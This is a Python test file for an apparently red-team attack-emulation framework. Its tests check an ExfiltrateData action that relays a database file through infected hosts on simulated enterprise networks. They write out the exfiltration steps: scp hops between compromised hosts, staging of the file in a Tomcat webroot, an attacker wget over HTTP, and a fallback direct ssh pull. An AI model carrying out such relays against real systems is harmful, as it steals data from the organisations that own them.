"""The relay chain ExfiltrateData walks, for the two topologies that matter.

enterprise_b is the regression: its databases sit two subnets behind the webservers,
so the single relay hop ExfiltrateData used to hardcode had no route and every
exfiltration there failed (while reporting success). equifax_small is the
backward-compatibility check: its chain must stay two hosts long, so the relay does
exactly the one scp + wget it always did.
"""

import asyncio

from incalmo.core.actions.HighLevel.exfiltrate_data import ExfiltrateData
from incalmo.core.actions.LowLevel import (
    ListFilesInDirectory,
    MD5SumAttackerData,
    ReadFile,
)
from incalmo.core.models.events import (
    ExfiltratedData,
    FileContentsFound,
    FilesFound,
)
from incalmo.core.models.network import Host, Network, Subnet
from incalmo.core.models.network.credential import SSHCredential
from incalmo.core.models.network.open_port import OpenPort
from incalmo.core.services.action_context import HighLevelContext
from incalmo.core.services.attack_graph_service import AttackGraphService
from incalmo.models.agent import Agent

SSH = OpenPort(port=22, service="ssh")
HTTP = OpenPort(port=8080, service="http")


def make_host(hostname, ip, ports, infected=True):
    agents = []
    if infected:
        agents = [
            Agent(
                paw=f"paw-{hostname}",
                username="ubuntu",
                privilege="User",
                pid=1,
                host_ip_addrs=[ip],
                hostname=hostname,
            )
        ]
    return Host(
        ip_addresses=[ip],
        hostname=hostname,
        open_ports={p.port: p for p in ports},
        agents=agents,
    )


def grant(src: Host, dst: Host, utilized=True):
    """src holds a credential to dst, as setup_ssh_keys lays down."""
    cred = SSHCredential(
        hostname=dst.hostname,
        host_ip=dst.ip_addresses[0],
        username="ubuntu",
        port="22",
        agent_discovered=src.agents[0],
    )
    cred.utilized = utilized
    src.ssh_config.append(cred)


def service(*subnets):
    class _Env:
        network = Network(list(subnets))

    return AttackGraphService(_Env())


def test_enterprise_b_chain_hops_through_the_employee_subnet():
    # webserver_subnet <-> employee_a_subnet <-> database_subnet; NO webserver<->database
    webserver = make_host("webserver0", "10.0.200.10", [SSH, HTTP])
    employeea = make_host("employeea0", "10.0.201.10", [SSH])
    database = make_host("database0", "10.0.203.10", [SSH])
    grant(webserver, employeea)
    grant(employeea, database)

    svc = service(
        Subnet("10.0.200.0/24", [webserver]),
        Subnet("10.0.201.0/24", [employeea]),
        Subnet("10.0.203.0/24", [database]),
    )

    assert svc.find_exfiltration_path(database) == [database, employeea, webserver]


def test_equifax_small_chain_is_still_a_single_hop():
    # webserver_subnet <-> corporate_subnet, and the webserver owns the db credential
    webserver = make_host("webserver0", "10.0.100.10", [SSH, HTTP])
    database = make_host("database0", "10.0.101.10", [SSH])
    grant(webserver, database)

    svc = service(
        Subnet("10.0.100.0/24", [webserver]),
        Subnet("10.0.101.0/24", [database]),
    )

    assert svc.find_exfiltration_path(database) == [database, webserver]


def test_uninfected_relay_is_not_a_hop():
    """A host we hold credentials to but never infected cannot run the scp."""
    webserver = make_host("webserver0", "10.0.200.10", [SSH, HTTP])
    employeea = make_host("employeea0", "10.0.201.10", [SSH], infected=False)
    database = make_host("database0", "10.0.203.10", [SSH])
    # grant() needs an agent to attribute discovery to, so borrow the webserver's
    cred = SSHCredential("database0", "10.0.203.10", "ubuntu", "22", webserver.agents[0])
    cred.utilized = True
    employeea.ssh_config.append(cred)
    grant(webserver, employeea)

    svc = service(
        Subnet("10.0.200.0/24", [webserver]),
        Subnet("10.0.201.0/24", [employeea]),
        Subnet("10.0.203.0/24", [database]),
    )

    assert svc.find_exfiltration_path(database) is None


def test_unused_credential_is_not_a_hop():
    """An unutilized credential is no evidence the hop is reachable."""
    webserver = make_host("webserver0", "10.0.200.10", [SSH, HTTP])
    database = make_host("database0", "10.0.203.10", [SSH])
    grant(webserver, database, utilized=False)

    svc = service(
        Subnet("10.0.200.0/24", [webserver]),
        Subnet("10.0.203.0/24", [database]),
    )

    assert svc.find_exfiltration_path(database) is None


def test_target_running_http_needs_no_relay():
    database = make_host("database0", "10.0.203.10", [SSH, HTTP])
    svc = service(Subnet("10.0.203.0/24", [database]))

    assert svc.find_exfiltration_path(database) == [database]


# --- the relay itself ---------------------------------------------------------


class FakeOrchestrator:
    """Records every dispatched command and fakes the few that return events."""

    def __init__(self, exfil_lands=True, keyless=()):
        self.commands = []
        self.exfil_lands = exfil_lands
        # (hostname, username) pairs whose ~/.ssh holds no public key, as an agent
        # dropped onto an account that never had one does not.
        self.keyless = set(keyless)
        self.landed = []

    async def run_action(self, action, context=None):
        self.commands.append((action.agent.hostname, action.command))
        if isinstance(action, ListFilesInDirectory):
            a = action.agent
            if (a.hostname, a.username) in self.keyless:
                return [FilesFound(a, ["authorized_keys"])]
            return [FilesFound(a, ["id_rsa.pub"])]
        if isinstance(action, ReadFile):
            return [FileContentsFound(action.command, "ssh-rsa AAAAFAKEKEY")]
        if isinstance(action, MD5SumAttackerData):
            if not self.exfil_lands:
                return []
            return [ExfiltratedData(name, "d41d8cd9") for name in self.landed]
        return []


class FakeEnvState:
    environment_type = "enterprise"

    def __init__(self, network, initial_hosts):
        self.network = network
        self.initial_hosts = initial_hosts


def enterprise_b_fixture():
    """attacker -- webserver0 -- employeea0 -- database0, as enterprise_b wires it."""
    attacker = make_host("attacker0", "10.0.202.10", [])
    webserver = make_host("webserver0", "10.0.200.10", [SSH, HTTP])
    employeea = make_host("employeea0", "10.0.201.10", [SSH])
    database = make_host("database0", "10.0.203.10", [SSH])
    grant(webserver, employeea)
    grant(employeea, database)
    database.critical_data_files = {"ubuntu": ["~/data_database0.json"]}

    network = Network(
        [
            Subnet("10.0.202.0/24", [attacker], attacker_subnet=True),
            Subnet("10.0.200.0/24", [webserver]),
            Subnet("10.0.201.0/24", [employeea]),
            Subnet("10.0.203.0/24", [database]),
        ]
    )
    env = FakeEnvState(network, [attacker])
    return env, AttackGraphService(env), database, webserver, employeea


def scp_commands(orchestrator):
    return [(host, cmd) for host, cmd in orchestrator.commands if cmd.startswith("scp ")]


async def run_exfil(orchestrator, env, svc, target):
    return await ExfiltrateData(target).run(
        orchestrator, env, svc, HighLevelContext(hl_id="test")
    )


def test_enterprise_b_relays_the_file_hop_by_hop():
    env, svc, database, webserver, employeea = enterprise_b_fixture()
    orch = FakeOrchestrator()
    orch.landed = ["data_database0.json"]

    asyncio.run(run_exfil(orch, env, svc, database))

    scps = scp_commands(orch)
    assert len(scps) == 2, scps

    # hop 1: employeea0 pulls the file out of the database into its own home
    host, cmd = scps[0]
    assert host == "employeea0"
    assert "ubuntu@10.0.203.10:~/data_database0.json" in cmd
    assert "/opt/tomcat" not in cmd

    # hop 2: webserver0 pulls it off employeea0 and into the webroot it serves
    host, cmd = scps[1]
    assert host == "webserver0"
    assert "ubuntu@10.0.201.10:data_database0.json" in cmd
    assert cmd.endswith("/opt/tomcat/webapps/ROOT/data_database0.json")

    # and the attacker fetches it over http from the webserver
    assert (
        "attacker0",
        "wget -P $(getent passwd $(whoami) | cut -d: -f6)/ "
        "http://10.0.200.10:8080/data_database0.json",
    ) in orch.commands


def test_equifax_small_relay_is_unchanged():
    webserver = make_host("webserver0", "10.0.100.10", [SSH, HTTP])
    database = make_host("database0", "10.0.101.10", [SSH])
    attacker = make_host("attacker0", "10.0.102.10", [])
    grant(webserver, database)
    database.critical_data_files = {"ubuntu": ["~/data_database0.json"]}
    env = FakeEnvState(
        Network(
            [
                Subnet("10.0.102.0/24", [attacker], attacker_subnet=True),
                Subnet("10.0.100.0/24", [webserver]),
                Subnet("10.0.101.0/24", [database]),
            ]
        ),
        [attacker],
    )
    orch = FakeOrchestrator()
    orch.landed = ["data_database0.json"]

    asyncio.run(run_exfil(orch, env, AttackGraphService(env), database))

    scps = scp_commands(orch)
    assert len(scps) == 1, scps
    host, cmd = scps[0]
    assert host == "webserver0"
    assert "ubuntu@10.0.101.10:~/data_database0.json" in cmd
    assert cmd.endswith("/opt/tomcat/webapps/ROOT/data_database0.json")


def test_relay_that_never_delivers_falls_back_to_ssh():
    """The old code returned True unconditionally, so this fallback never ran."""
    env, svc, database, _, _ = enterprise_b_fixture()
    orch = FakeOrchestrator(exfil_lands=False)

    asyncio.run(run_exfil(orch, env, svc, database))

    # the attacker tries to pull the file itself after the http relay came up empty
    assert any(
        host == "attacker0" and "10.0.203.10:~/data_database0.json" in cmd
        for host, cmd in scp_commands(orch)
    )


def test_relay_uses_the_agent_that_owns_a_key():
    """employeea0 runs a root agent with a keypair and an ubuntu agent without one.

    Regression: the relay agent was picked with Host.get_agent() (random.choice) while
    add_ssh_key only ever authorizes an agent that HAS a key, so a random pick of the
    keyless agent relayed as a user no authorized_keys trusted and died with
    "Permission denied (publickey)". Seen live on enterprise_b: the same two-agent host
    exfiltrated database6 as root and then failed database1 as ubuntu.
    """
    env, svc, database, _, employeea = enterprise_b_fixture()
    # the keyless agent goes FIRST, so neither a random pick nor a naive "first agent"
    # lands on the right one -- only actually checking for a key does
    employeea.agents[0].username = "root"
    employeea.agents.insert(
        0,
        Agent(
            paw="paw-employeea0-ubuntu",
            username="ubuntu",
            privilege="User",
            pid=2,
            host_ip_addrs=employeea.ip_addresses,
            hostname="employeea0",
        ),
    )
    orch = FakeOrchestrator(keyless=[("employeea0", "ubuntu")])
    orch.landed = ["data_database0.json"]

    asyncio.run(run_exfil(orch, env, svc, database))

    scps = scp_commands(orch)
    assert len(scps) == 2, scps
    # hop 1 must RUN on employeea0 (either agent can run it -- the C2 does not need ssh)
    assert scps[0][0] == "employeea0"
    # hop 2 must pull as root@employeea0: the only identity whose key was installed
    assert "root@10.0.201.10:data_database0.json" in scps[1][1], scps[1][1]
    assert "ubuntu@10.0.201.10" not in scps[1][1]


def test_relay_aborts_when_no_agent_on_a_hop_owns_a_key():
    """No key to install means no hop is authorized, so fall back rather than fail blind."""
    env, svc, database, _, employeea = enterprise_b_fixture()
    orch = FakeOrchestrator(keyless=[("employeea0", "ubuntu")])

    asyncio.run(run_exfil(orch, env, svc, database))

    # the http relay never ran a hop off the database...
    assert not any("10.0.203.10:" in cmd and host == "employeea0"
                   for host, cmd in scp_commands(orch))
    # ...and the attacker tried the direct ssh pull instead
    assert any(host == "attacker0" for host, cmd in scp_commands(orch))
